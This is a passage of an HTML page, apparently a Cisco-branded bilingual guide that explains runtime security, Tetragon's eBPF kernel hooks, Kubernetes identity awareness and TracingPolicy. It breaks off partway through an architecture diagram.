<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Cisco Security Insight: Tetragon & eBPF Comprehensive Guide</title>
    <style>
        /* --- Cisco Brand Identity System --- */
        :root {
            --cisco-blue: #049FD9;
            --cisco-midnight: #0D274D;
            --cisco-sky: #6ABF4B;
            --cisco-slate: #58585B;
            --cisco-light-gray: #F2F2F2;
            --cisco-platinum: #E4E4E4;
            --cisco-green: #6CC24A;
            --cisco-red: #E2231A;
            --cisco-orange: #F58025;
            --white: #FFFFFF;
            --shadow-card: 0 8px 24px rgba(13, 39, 77, 0.08);
            --shadow-hover: 0 12px 32px rgba(13, 39, 77, 0.15);
            --radius-sm: 4px;
            --radius-md: 8px;
            --radius-lg: 16px;
        }

        /* --- Typography & Base --- */
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-font-smoothing: antialiased; }
        
        body {
            font-family: "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: var(--cisco-slate);
            background-color: #FAFAFA;
            line-height: 1.6;
        }

        h1, h2, h3, h4 { color: var(--cisco-midnight); font-weight: 700; letter-spacing: -0.5px; }
        p { margin-bottom: 1.2rem; font-size: 1.05rem; }
        
        /* --- Language Toggling --- */
        body.lang-zh .lang-en { display: none !important; }
        body.lang-en .lang-zh { display: none !important; }

        .lang-switch {
            position: absolute; top: 20px; right: 20px; z-index: 100;
            background: rgba(255, 255, 255, 0.15); border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 20px; padding: 4px; display: flex; backdrop-filter: blur(4px);
        }

        .lang-btn {
            background: transparent; border: none; color: rgba(255, 255, 255, 0.7);
            padding: 6px 16px; border-radius: 16px; font-size: 0.85rem; font-weight: 600;
            cursor: pointer; transition: all 0.2s;
        }

        .lang-btn.active { background: white; color: var(--cisco-midnight); box-shadow: 0 2px 8px rgba(0,0,0,0.2); }

        /* --- Layout --- */
        .container { max-width: 1100px; margin: 0 auto; padding: 0 24px; }
        section { padding: 80px 0; border-bottom: 1px solid var(--cisco-platinum); background: var(--white); }
        section:nth-child(even) { background: #F9FAFB; }

        /* --- Header / Hero --- */
        header {
            background: linear-gradient(135deg, var(--cisco-midnight) 0%, #005073 100%);
            color: white; padding: 100px 0 80px; position: relative;
            clip-path: polygon(0 0, 100% 0, 100% 90%, 0 100%);
        }

        .hero-tag {
            background: rgba(255,255,255,0.1); color: #61C6E2; padding: 6px 16px;
            border-radius: 20px; font-size: 0.85rem; font-weight: 600;
            text-transform: uppercase; letter-spacing: 1px; display: inline-block;
            margin-bottom: 24px; border: 1px solid rgba(4, 159, 217, 0.3);
        }

        h1 { color: white; font-size: 3rem; margin-bottom: 20px; line-height: 1.1; }
        .hero-sub { font-size: 1.25rem; color: rgba(255,255,255,0.85); max-width: 700px; margin-bottom: 40px; }

        /* --- Section Titles --- */
        .section-header { text-align: center; max-width: 850px; margin: 0 auto 60px; }
        .section-header h2 { font-size: 2.25rem; margin-bottom: 16px; position: relative; display: inline-block; }
        .section-header h2::after {
            content: ''; display: block; width: 60px; height: 4px; background: var(--cisco-blue);
            margin: 12px auto 0; border-radius: 2px;
        }

        /* --- Grid & Cards --- */
        .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 32px; }
        .grid-4 { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 24px; }
        
        .card {
            background: white; padding: 35px 28px; border-radius: var(--radius-lg);
            box-shadow: var(--shadow-card); transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            border-top: 4px solid transparent; height: 100%;
        }
        .card:hover { transform: translateY(-8px); box-shadow: var(--shadow-hover); border-top-color: var(--cisco-blue); }
        
        .definition-card {
            background: white; padding: 20px; border-radius: var(--radius-md);
            border: 1px solid var(--cisco-platinum); border-left: 4px solid var(--cisco-blue);
        }

        /* --- Sequential Perspectives Styles --- */
        .view-section { margin-bottom: 60px; }
        .view-title { 
            color: var(--cisco-midnight); font-size: 1.6rem; margin-bottom: 25px; 
            border-bottom: 2px solid var(--cisco-platinum); padding-bottom: 10px;
            display: flex; align-items: center; gap: 12px;
        }
        .view-title::before { content: ""; display: block; width: 4px; height: 1.2em; background: var(--cisco-blue); border-radius: 2px; }

        .highlight-box {
            background: #F0F7FA; border-left: 4px solid var(--cisco-blue);
            padding: 25px; border-radius: 0 var(--radius-md) var(--radius-md) 0;
            margin: 30px 0;
        }

        /* --- Ancestry Tree Styles --- */
        .ancestry-container {
            display: flex; flex-direction: column; align-items: flex-start;
            padding: 40px; background: #F8FAFC; border-radius: 12px;
            border: 1px dashed var(--cisco-platinum); position: relative;
        }
        .ancestry-node {
            display: flex; align-items: center; gap: 15px;
            background: white; padding: 12px 20px; border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.05); margin-bottom: 30px;
            border: 1px solid var(--cisco-platinum); position: relative;
            min-width: 280px; z-index: 2;
        }
        .ancestry-node::after {
            content: ''; position: absolute; left: 35px; top: 100%;
            width: 2px; height: 30px; background: var(--cisco-blue);
        }
        .ancestry-node:last-child::after { display: none; }
        .ancestry-node.alert { border: 2px solid var(--cisco-red); background: #FFF5F5; }
        .ancestry-node.alert::after { background: var(--cisco-red); }
        .node-icon { 
            width: 32px; height: 32px; border-radius: 6px; 
            display: flex; align-items: center; justify-content: center;
            background: var(--cisco-midnight); color: white;
        }
        .node-info { flex: 1; }
        .node-name { font-weight: 700; font-size: 0.9rem; color: var(--cisco-midnight); }
        .node-meta { font-size: 0.75rem; color: var(--cisco-slate); }
        .node-tag { 
            font-size: 10px; padding: 2px 6px; border-radius: 4px; 
            background: var(--cisco-light-gray); margin-left: auto;
            text-transform: uppercase; font-weight: bold;
        }

        /* --- Policy Discovery Interactive Styles --- */
        .discovery-card {
            background: #FFFFFF; border: 1px solid var(--cisco-platinum);
            border-radius: 12px; padding: 0; overflow: hidden;
            display: grid; grid-template-columns: 1.2fr 1fr; gap: 0;
            box-shadow: var(--shadow-card); margin-bottom: 40px;
        }
        .log-side { background: #1A1F2B; padding: 25px; color: #ADBAC7; font-family: 'Courier New', monospace; font-size: 0.85rem; border-right: 1px solid #30363D; }
        .policy-side { background: #FFFFFF; padding: 25px; position: relative; }
        .log-line { margin-bottom: 10px; border-left: 2px solid #444; padding-left: 12px; opacity: 0.7; transition: all 0.3s; }
        .log-line.highlight { opacity: 1; border-left-color: var(--cisco-blue); background: rgba(4, 159, 217, 0.1); }
        .policy-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px; }
        
        .pulse-wave { animation: pulse-border 2s infinite; }
        @keyframes pulse-border {
            0% { box-shadow: 0 0 0 0 rgba(108, 194, 74, 0.4); }
            70% { box-shadow: 0 0 0 15px rgba(108, 194, 74, 0); }
            100% { box-shadow: 0 0 0 0 rgba(108, 194, 74, 0); }
        }

        .yaml-transfer { animation: slide-up 0.5s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
        @keyframes slide-up {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        /* --- Mechanism Description Blocks --- */
        .mechanism-card {
            background: #FFFFFF; border: 1px solid var(--cisco-platinum);
            border-radius: 12px; padding: 35px; margin-bottom: 40px;
            box-shadow: var(--shadow-card);
            position: relative;
        }
        .mechanism-card h4 { color: var(--cisco-blue); margin-bottom: 15px; border-left: 4px solid var(--cisco-blue); padding-left: 15px; font-size: 1.4rem; }

        /* --- Linux Terminal --- */
        .terminal {
            background: #111111; border-radius: var(--radius-md); overflow: hidden;
            font-family: 'Courier New', monospace; box-shadow: 0 20px 50px rgba(0,0,0,0.3); margin-top: 20px;
            border: 1px solid #333; transition: all 0.2s; position: relative;
        }
        .terminal-bar { background: #2A2A2A; padding: 12px; display: flex; gap: 8px; align-items: center; }
        .traffic-light { width: 12px; height: 12px; border-radius: 50%; }
        .traffic-light.red { background: #ff5f56; }
        .traffic-light.yellow { background: #ffbd2e; }
        .traffic-light.green { background: #27c93f; }
        .terminal-content { padding: 20px; min-height: 250px; color: #EEE; font-size: 14px; overflow-y: auto; z-index: 2; position: relative; }
        .prompt { color: var(--cisco-green); font-weight: bold; }
        .alert-text { color: var(--cisco-red); font-weight: bold; background: rgba(226, 35, 26, 0.1); padding: 2px 6px; border-radius: 4px; }
        .cursor { display: inline-block; width: 10px; height: 18px; background: #CCC; animation: blink 1s infinite; vertical-align: middle;}
        @keyframes blink { 50% { opacity: 0; } }

        /* --- Code & YAML Blocks --- */
        .yaml-block {
            background: #1E1E1E; border-radius: var(--radius-md); padding: 24px;
            font-family: 'Consolas', monospace; font-size: 0.9rem; color: #D4D4D4;
            border-left: 4px solid var(--cisco-green); overflow-x: auto; white-space: pre; margin: 20px 0;
        }
        .yaml-key { color: #569CD6; font-weight: bold; }
        .yaml-val { color: #CE9178; }
        .yaml-action { color: #C586C0; font-weight: bold; }

        /* --- Dashboard Mockup --- */
        .dashboard-mock {
            background: #1C222D; border-radius: 12px; padding: 25px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3); margin-top: 30px;
        }
        .dash-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
        .dash-widget { background: #262E3D; border-radius: 8px; padding: 15px; display: flex; flex-direction: column; min-height: 100px; border: 1px solid rgba(255,255,255,0.05); }
        .dash-label { color: #888; font-size: 0.75rem; margin-bottom: 5px; }
        .dash-value { color: var(--cisco-blue); font-size: 1.6rem; font-weight: bold; margin-top: auto; }

        /* --- Expert Perspective Box --- */
        .expert-persp-box {
            background: linear-gradient(to right, #0D274D, #005073);
            color: white; padding: 30px; border-radius: 12px; margin-top: 40px;
            position: relative; overflow: hidden;
            border-left: 5px solid var(--cisco-orange);
        }
        .expert-persp-box::after {
            content: "DEEP DIVE"; position: absolute; top: 10px; right: -30px;
            background: var(--cisco-orange); font-size: 10px; font-weight: bold;
            padding: 5px 40px; transform: rotate(45deg);
        }

        /* --- Final Conclusion Section --- */
        .final-conclusion { 
            background-color: var(--cisco-midnight) !important; 
            padding: 100px 0; 
            color: #FFFFFF !important; 
            border-bottom: none;
        }
        .final-conclusion h2 { 
            color: #FFFFFF !important; 
            text-align: center; 
            margin-bottom: 40px; 
            font-size: 2.5rem; 
        }
        .final-conclusion h2::after { 
            content: ''; display: block; width: 80px; height: 4px; background: var(--cisco-blue); margin: 20px auto 0;
        }
        .conclusion-core { 
            color: #FFFFFF !important; 
            font-size: 1.35rem; 
            max-width: 900px; 
            margin: 0 auto 60px; 
            text-align: center; 
            line-height: 1.8; 
            font-weight: 500;
            background: rgba(255,255,255,0.05);
            padding: 30px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .conclusion-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
            gap: 40px; 
            max-width: 1000px; 
            margin: 0 auto; 
        }
        .conclusion-item { 
            background: rgba(255,255,255,0.08); 
            padding: 35px; 
            border-radius: 16px; 
            border: 1px solid rgba(255,255,255,0.15); 
        }
        .conclusion-item strong { 
            color: var(--cisco-blue); 
            display: block; 
            margin-bottom: 15px; 
            font-size: 1.25rem; 
        }
        .conclusion-item p { 
            color: #FFFFFF !important; 
            font-size: 1.05rem; 
            margin-bottom: 0; 
            opacity: 0.95;
            line-height: 1.6;
        }

        /* --- BEAUTIFIED CASE BADGE --- */
        .case-badge { 
            background: linear-gradient(135deg, var(--cisco-midnight) 0%, #005073 100%);
            color: white; 
            padding: 5px 16px; 
            border-radius: 50px; 
            font-size: 0.75rem; 
            font-weight: 700; 
            margin-bottom: 15px; 
            display: inline-block; 
            text-transform: uppercase; 
            letter-spacing: 1.2px;
            border: 1px solid rgba(4, 159, 217, 0.4);
            box-shadow: 0 4px 10px rgba(13, 39, 77, 0.2);
            position: relative;
        }

        /* --- [NEW] MITRE TAG STYLES --- */
        .mitre-tag {
            font-size: 0.7rem;
            background: rgba(4, 159, 217, 0.1);
            color: var(--cisco-blue);
            padding: 3px 8px;
            border-radius: 4px;
            font-weight: bold;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            margin-left: 10px;
            border: 1px solid rgba(4, 159, 217, 0.2);
        }

        /* --- [NEW] IDENTITY SECTION STYLES --- */
        .identity-box {
            background: #FFFFFF;
            border-radius: var(--radius-lg);
            padding: 40px;
            margin: 40px 0;
            border: 1px solid var(--cisco-platinum);
            display: flex;
            gap: 40px;
            align-items: center;
        }
        .identity-visual {
            flex: 1;
            background: #F8FAFC;
            padding: 30px;
            border-radius: 12px;
            border: 2px dashed #CBD5E1;
        }

        /* --- [NEW] PIPELINE STYLES --- */
        .pipeline-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 40px 0;
            gap: 20px;
        }
        .pipeline-node {
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: var(--shadow-card);
            flex: 1;
            text-align: center;
            border-bottom: 4px solid var(--cisco-blue);
        }

        /* --- [NEW] MTTR CARD --- */
        .mttr-card {
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: var(--shadow-card);
            margin-top: 30px;
            border-left: 5px solid var(--cisco-green);
        }
        .mttr-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-top: 15px;
        }
        .mttr-stat {
            background: #F8FAFC;
            padding: 15px;
            border-radius: 8px;
        }

        /* --- [NEW] TERMINAL ENHANCEMENT STYLES --- */
        .login-info { color: #888; font-size: 0.8rem; margin-bottom: 12px; }
        .json-log-view {
            font-size: 0.75rem;
            color: #888;
            background: rgba(0,0,0,0.3);
            padding: 10px;
            border-radius: 4px;
            margin: 12px 0;
            border-left: 2px solid var(--cisco-blue);
            font-family: 'Courier New', monospace;
        }
        .terminal-output-line { margin: 8px 0; }

        /* --- [NEW] TABS FOR INSTALLATION --- */
        .tab-container { margin: 20px 0; }
        .tab-header { display: flex; gap: 10px; margin-bottom: 15px; }
        .tab-btn { 
            padding: 8px 20px; border-radius: 20px; border: 1px solid var(--cisco-platinum); 
            background: white; cursor: pointer; font-weight: 600; color: var(--cisco-slate);
            transition: all 0.2s;
        }
        .tab-btn.active { background: var(--cisco-midnight); color: white; border-color: var(--cisco-midnight); }

        /* --- [ENHANCED] ENFORCEMENT STATUS BADGE --- */
        .enforcement-status {
            position: absolute; top: 35px; right: 35px;
            padding: 4px 12px; border-radius: 4px; font-size: 0.7rem; font-weight: bold;
            display: flex; align-items: center; gap: 6px;
            background: #EEE; color: #888; border: 1px solid #DDD;
            transition: all 0.4s ease;
        }
        .enforcement-status.active {
            background: rgba(4, 159, 217, 0.1); color: var(--cisco-blue); border-color: var(--cisco-blue);
        }
        .status-dot { width: 6px; height: 6px; border-radius: 50%; background: #888; }
        .enforcement-status.active .status-dot { 
            background: var(--cisco-blue); 
            box-shadow: 0 0 8px var(--cisco-blue);
            animation: pulse-dot 1.5s infinite;
        }
        @keyframes pulse-dot { 
            0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; }
        }

        /* --- [ENHANCED] SHIELD WATERMARK --- */
        .shield-watermark {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 150px; height: 150px; opacity: 0; pointer-events: none;
            z-index: 1; transition: opacity 0.5s;
        }
        .shield-watermark svg { fill: rgba(108, 194, 74, 0.1); }
        .shield-active .shield-watermark { opacity: 1; }

        /* --- [ENHANCED] PERFORMANCE PANEL --- */
        .perf-insight-panel {
            background: #FFFFFF; border-radius: 12px; padding: 25px;
            margin-top: 30px; border: 1px solid var(--cisco-platinum);
            display: flex; gap: 30px; align-items: center;
        }
        .perf-bar-chart { flex: 1; display: flex; flex-direction: column; gap: 15px; }
        .perf-bar-item { width: 100%; }
        .perf-label { font-size: 0.8rem; margin-bottom: 4px; display: flex; justify-content: space-between; }
        .perf-track { height: 8px; background: #F2F2F2; border-radius: 4px; overflow: hidden; }
        .perf-fill { height: 100%; border-radius: 4px; transition: width 1s; }

        /* --- [ENHANCED] ROADMAP STYLES --- */
        .roadmap-container { display: flex; gap: 20px; margin: 40px 0; }
        .roadmap-step { 
            flex: 1; background: white; padding: 25px; border-radius: 12px; 
            border: 1px solid var(--cisco-platinum); position: relative;
            box-shadow: var(--shadow-card);
        }
        .roadmap-step::after {
            content: "→"; position: absolute; right: -15px; top: 50%; transform: translateY(-50%);
            font-size: 1.5rem; color: var(--cisco-platinum);
        }
        .roadmap-step:last-child::after { display: none; }
        .step-num { width: 24px; height: 24px; background: var(--cisco-blue); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; margin-bottom: 15px; }

        @media (max-width: 768px) {
            h1 { font-size: 2.2rem; }
            .grid-3, .grid-4, .dash-grid, .perf-insight-panel, .roadmap-container { grid-template-columns: 1fr; flex-direction: column; }
            .final-conclusion { padding: 60px 0; }
            .discovery-card { grid-template-columns: 1fr; }
            .identity-box, .mttr-grid { flex-direction: column; grid-template-columns: 1fr; }
            .roadmap-step::after { content: "↓"; right: 50%; top: auto; bottom: -20px; transform: translateX(50%); }
        }
    </style>
</head>
<body class="lang-zh">

    <!-- Hero Section -->
    <header>
        <div class="lang-switch">
            <button class="lang-btn active" id="btn-zh" onclick="setLanguage('zh')">中文</button>
            <button class="lang-btn" id="btn-en" onclick="setLanguage('en')">EN</button>
        </div>
        <div class="container">
            <div class="hero-tag">Cisco Technology Radar: eBPF & Tetragon</div>
            <h1>
                <span class="lang-zh">Tetragon:<br>云原生安全的最后一道防线</span>
                <span class="lang-en">Tetragon:<br>The Final Line of Defense for<br>Cloud-Native Security</span>
            </h1>
            <p class="hero-sub">
                <span class="lang-zh">在现代化的 IT 架构中，外围防火墙已不足以应对威胁。Tetragon 利用 eBPF 技术，将安全防御下沉至 Linux 内核最深处，实现真正的亚毫秒级实时阻断。</span>
                <span class="lang-en">In modern IT architectures, perimeter firewalls are no longer enough. Tetragon utilizes eBPF technology to embed security deep into the Linux kernel for true real-time enforcement.</span>
            </p>
            <div style="display:flex; gap:16px;">
                <button class="btn-primary" onclick="scrollToId('lab-section')" style="background: var(--cisco-blue); color: white; border: none; padding: 14px 32px; border-radius: 30px; font-weight: 600; cursor: pointer;">启动演练实验室</button>
                <button class="btn-outline" style="background: transparent; border: 2px solid white; color: white; padding: 14px 32px; border-radius: 30px; font-weight: 600; cursor: pointer;" onclick="scrollToId('how-it-works')">技术原理</button>
            </div>
        </div>
    </header>

    <!-- Section 1: Definition & Dimensions -->
    <section id="what-is-runtime">
        <div class="container">
            <div class="section-header">
                <h2>什么是运行时安全？</h2>
                <p>运行时安全是指在应用程序<b>执行过程中</b>对其进行监控和防护。它关注的是“现在正在发生什么”，而不是代码在构建时是什么样子。</p>
            </div>

            <div class="view-section">
                <div class="highlight-box">
                    <strong>核心价值：弥补“左移安全”的盲区</strong>
                    <p>即使镜像扫描和静态配置分析（Shift Left）是完美的，也无法覆盖 0-day 漏洞利用、供应链污染或运行时的特权提升。运行时安全提供 <b>“Shield Right”</b>，在恶意行为发生的瞬间构建最后一道防线。</p>

                    <div class="grid-3" style="margin-top: 30px;">
                        <div class="definition-card">
                            <strong>左移安全 (Shift Left)</strong>
                            <p style="font-size: 0.9rem; margin-top:10px;">将安全检查前移到开发阶段。通过代码扫描、镜像审计发现已知缺陷，防患于未然。</p>
                        </div>
                        <div class="definition-card" style="border-color: var(--cisco-midnight);">
                            <strong>运行时盾牌 (Shield Right)</strong>
                            <p style="font-size: 0.9rem; margin-top:10px;">在生产运行阶段构建实时屏障。应对那些绕过开发阶段检查的未知威胁（0-day）或内部破坏。</p>
                        </div>
                    </div>
                </div>
            </div>

            <div class="view-section">
                <div class="view-title">主要监控维度</div>
                <div class="grid-4">
                    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                        <strong>进程执行</strong>
                        <p style="font-size: 0.9rem;">追踪二进制文件的全生命周期：谁启动了程序？是否派生了非法的子进程或 Shell？</p>
                    </div>
                    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                        <strong>文件访问</strong>
                        <p style="font-size: 0.9rem;">监控关键路径：敏感配置文件（如 <code>/etc/shadow</code>）是否被未授权篡改或非法读取？</p>
                    </div>
                    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                        <strong>网络通信</strong>
                        <p style="font-size: 0.9rem;">感知连接意图：进程是否建立了非预期的外连或尝试访问恶意的 C2 域名？</p>
                    </div>
                    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                        <strong>特权变更</strong>
                        <p style="font-size: 0.9rem;">识别越权行为：普通用户进程是否突然提权变成 Root？是否发生了异常的 Capability 变更？</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Section 2: Tetragon & TracingPolicy -->
    <section id="what-is-tetragon" style="background: #F9FAFB;">
        <div class="container">
            <div class="section-header">
                <h2>什么是 Tetragon?</h2>
                <p>Tetragon 是 Cilium 开源社区下的核心项目，它利用 <b>eBPF</b> 技术提供深度的内核级安全观测。不同于传统的安全工具，它能感知 <b>Kubernetes 身份</b>（Pod, Namespace, Labels），并在恶意行为发生的瞬间在内核态将其阻断。传统安全依赖用户态 Agent，容易被绕过。Tetragon 挂载在内核执行路径的核心点（如 LSM 或系统调用入口），提供“不可绕过”的审计一致性。</p>
            </div>

            <!-- [NEW] Identity-Aware Content Deepening -->
            <div class="identity-box">
                <div style="flex: 1.2;">
                    <div class="case-badge" style="background: var(--cisco-blue);">Expert Deep Dive</div>
                    <h3 style="margin-bottom:15px;">为什么身份感知 (Identity-Aware) 至关重要？</h3>
                    <p style="font-size: 0.95rem;">在云原生环境中，IP 地址是转瞬即逝的，PID 在不同容器间可能冲突。Tetragon 的核心能力在于它能<b>实时感知上下文</b>。</p>
                    <ul style="font-size: 0.9rem; padding-left: 20px;">
                        <li><b>task_struct 关联：</b> 直接从内核进程结构体获取 Cgroup 信息。</li>
                        <li><b>零开销映射：</b> 利用 eBPF Map 将 Cgroup ID 毫秒级映射到 K8s Pod 标签。</li>
                        <li><b>审计一致性：</b> 日志中自带 Namespace/ServiceAccount，无需事后从日志中心进行复杂的 Trace ID 关联。</li>
                    </ul>
                </div>
                <div class="identity-visual">
                    <div style="font-family: monospace; font-size: 0.8rem; line-height: 1.4;">
                        <span style="color: #888;"># Kernel Task Info</span><br>
                        PID: <span style="color: var(--cisco-blue);">2550</span><br>
                        CGROUP_ID: <span style="color: var(--cisco-sky);">0x44fa...</span><br>
                        <span style="color: #888;">↓ Tetragon In-Kernel Map ↓</span><br>
                        POD_NAME: <span style="color: var(--cisco-orange);">payment-api-v2</span><br>
                        NAMESPACE: <span style="color: var(--cisco-midnight);">production</span><br>
                        LABELS: <span style="color: #555;">env=prod, app=payment</span>
                    </div>
                </div>
            </div>

            <div class="view-section" style="margin-top: 60px;">
                <div class="view-title">核心灵魂：TracingPolicy</div>
                <p>TracingPolicy 是一种 CRD（自定义资源声明），它定义了两个关键要素：</p>
                <div class="grid-3" style="margin-top:24px;">
                    <div class="definition-card">
                        <strong>触发条件 (Trigger)</strong>
                        <p style="font-size: 0.9rem; margin-top:10px;">特定的系统调用（Syscalls）或内核函数及其参数。例如：监控 <code>execve</code> 启动 shell 的行为。</p>
                    </div>
                    <div class="definition-card" style="border-color: var(--cisco-midnight);">
                        <strong>处置动作 (Action)</strong>
                        <p style="font-size: 0.9rem; margin-top:10px;">观测记录、发送信号（如 <b>SIGKILL</b>）或覆盖返回值（阻止恶意写入生效）。</p>
                    </div>
                </div>

                <div class="expert-persp-box">
                    <h4>专家视角 (Expert Perspective):</h4>
                    <p style="font-size: 1rem; margin-top:15px; opacity:0.95;">Tetragon 使用 <b>Kprobes</b> 和 <b>Tracepoints</b> 拦截内核事件。通过 <b>BPF Maps</b> 将内核数据高效传递至用户态的 Tetragon Agent 及其导出的 JSON 日志。这种架构确保了在微秒级别捕获并处理威胁，而不产生明显的业务抖动。</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Section 3: Perspectives (Business & Technical) -->
    <section id="perspectives">
        <div class="container">
            <div class="view-section">
                <div class="view-title">业务视角 (类比)</div>
                <div class="grid-3">
                    <div class="card">
                        <h3>传统安全：摄像头</h3>
                        <p>以前的安全工具（如日志分析）就像是摄像头。它能录下小偷行窃的过程，但当你发现录像时，小偷早就跑了，财产也损失了。这是<b>“异步检测”</b>。</p>
                    </div>
                    <div class="card">
                        <h3>Sidecar 模式：安检门</h3>
                        <p>Sidecar 代理就像在每个房间门口设安检。虽然能阻拦，但每个人进出都要排队，导致大楼（服务器）拥堵，性能下降，且容易被绕过。</p>
                    </div>
                    <div class="card">
                        <h3>Tetragon：智能免疫</h3>
                        <p>Tetragon 就像人体免疫细胞，直接驻扎在血液（内核）中。只要识别到病毒（恶意进程），无需等待大脑指令，直接吞噬（Kill）病毒。这是<b>“同步阻断”</b>。</p>
                    </div>
                </div>
            </div>

            <div class="view-section">
                <div class="view-title">⚙️ 技术视角：内核深处的防御架构</div>
                <div class="grid-3">
                    <div class="card">
                        <h3>内核级可观测性</h3>
                        <p>利用 eBPF (Extended Berkeley Packet Filter)，Tetragon 能够在不修改内核源码、不加载内核模块的情况下，安全地动态追踪内核函数（kprobes, tracepoints）。</p>
                    </div>
                    <div class="card">
                        <h3>零开销数据上下文</h3>
                        <p>传统 eBPF 工具只输出 PID/IP。Tetragon 维护了一个内核内的状态表，能够即时将底层的系统调用映射到 Kubernetes 的 Pod, Namespace, Service 等高层元数据。</p>
                    </div>
                    <div class="card">
                        <h3>In-Kernel Enforcement</h3>
                        <p>Tetragon 不仅仅是“观察者”。它使用 <code>bpf_send_signal</code> 在恶意 syscall 完成前终止进程，杜绝了 <b>TOCTOU 攻击</b>。</p>
                        <div style="font-size: 0.8rem; background: #FFF5F5; padding: 10px; border-radius: 4px; margin-top: 10px; border: 1px solid #FFDADA;">
                            <strong>名词解释：TOCTOU 攻击</strong><br>
                            Time-of-Check to Time-of-Use。指攻击者在安全检查后与实际执行前的时间差内，替换了原本检查通过的资源（如文件链接），从而绕过用户态安全工具。
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Section 4: Technical Architecture (LSM Enhanced SVG) -->
    <section id="how-it-works" style="background: white;">
        <div class="container">
            <div class="section-header">
                <h2>技术架构：Tetragon 的运行逻辑</h2>
                <p>下图展示了 Tetragon 如何利用 <b>kprobes</b> 进行深度观测，并利用内核 <b>LSM BPF</b> 实现不可绕过的安全阻断。</p>
            </div>
            
            <div style="background: #F9FAFB; padding: 40px; border-radius: 16px; box-shadow: inset 0 2px 10px rgba(0,0,0,0.05); text-align: center;">
                <svg width="100%" height="450" viewBox="0 0 800 450" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                        <marker id="arrow-blue" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#049FD9" /></marker>
                        <marker id="arrow-red" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#E2231A" /></marker>
                        <filter id="glow" x="-20%" y="-20%" width="140%" height="140%"><feGaussianBlur stdDeviation="3" result="blur"/><feComposite in="SourceGraphic" in2="blur" operator="over"/></filter>
                    </defs>
                    <rect x="50" y="20" width="700" height="100" rx="8" fill="#F0F8FC" stroke="#049FD9" stroke-width="2" stroke-dasharray="5,5"/>
                    <text x="65" y="45" font-weight="bold" fill="#0D274D">User Space (用户空间)</text>
                    <circle cx="200" cy="70" r="25" fill="white" stroke="#049FD9" stroke-width="2"/>
                    <text x="200" y="74" text-anchor="middle" font-size="12" fill="#049FD9">App</text>
                    
                    <!-- [NEW] K8s Context in User Space -->
                    <rect x="580" y="40" width="140" height="60" rx="4" fill="#6ABF4B" fill-opacity="0.1" stroke="#6ABF4B"/>
                    <text x="650" y="65" text-anchor="middle" font-size="10" font-weight="bold" fill="#2E7D32">K8s Metadata Cache</text>
                    <text x="650" y="80" text-anchor="middle" font-size="9" fill="#2E7D32">(Pod/NS Labels)</text>

                    <rect x="50" y="160" width="700" height="260" rx="8" fill="#0D274D" />
                    <text x="65" y="185" font-weight="bold" fill="white">Kernel Space (内核空间)</text>
                    <line x1="200" y1="95" x2="200" y2="200" stroke="#049FD9" stroke-width="3" marker-end="url(#arrow-blue)"/>
                    <text x="210" y="145" fill="#58585B" font-size="12">1. Syscall Entry</text>
                    <rect x="120" y="210" width="160" height="60" rx="4" fill="#005073" stroke="#049FD9" stroke-width="2"/>
                    <text x="200" y="235" text-anchor="middle" fill="white" font-weight="bold">kprobe Hook</text>
                    <text x="200" y="255" text-anchor="middle" fill="#049FD9" font-size="11" font-weight="bold">【观测：收集上下文】</text>
                    
                    <!-- [NEW] eBPF Maps (Shared Storage) -->
                    <rect x="340" y="145" width="100" height="30" rx="15" fill="#F58025" fill-opacity="0.2" stroke="#F58025" stroke-dasharray="2"/>
                    <text x="390" y="165" text-anchor="middle" fill="#F58025" font-size="10" font-weight="bold">eBPF Maps</text>
                    <path d="M 390 175 L 390 210" stroke="#F58025" stroke-width="1" stroke-dasharray="2" marker-end="url(#arrow-blue)"/>

                    <path d="M 280 240 L 380 240" stroke="#049FD9" stroke-width="2" stroke-dasharray="4"/>
                    <rect x="380" y="210" width="180" height="140" rx="4" fill="#6CC24A"/>
                    <text x="470" y="270" text-anchor="middle" fill="#0D274D" font-weight="bold" font-size="16">Policy Engine</text>
                    
                    <rect x="120" y="320" width="160" height="60" rx="4" fill="#E2231A" filter="url(#glow)"/>
                    <text x="200" y="345" text-anchor="middle" fill="white" font-weight="bold">LSM BPF Hook</text>
                    <text x="200" y="365" text-anchor="middle" fill="#FFDADA" font-size="11" font-weight="bold">【阻断：不可绕过】</text>
